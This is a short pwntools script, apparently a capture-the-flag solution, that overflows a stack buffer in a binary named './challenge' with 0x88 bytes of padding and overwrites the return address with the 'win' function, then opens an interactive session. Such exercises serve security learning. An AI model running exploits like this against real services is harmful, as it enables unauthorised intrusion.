#!/usr/bin/env python3
from pwn import *
from time import sleep
import argparse
import sys

#### Setup
parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
args = parser.parse_args()

p = remote(args.host, args.port)

#### Exploit
context.binary = binary = './challenge'
e = ELF(binary)

padding = b'A'*0x88

payload = padding
payload += p64(e.symbols.win)

p.sendline(payload)

#### Interactive
p.interactive()
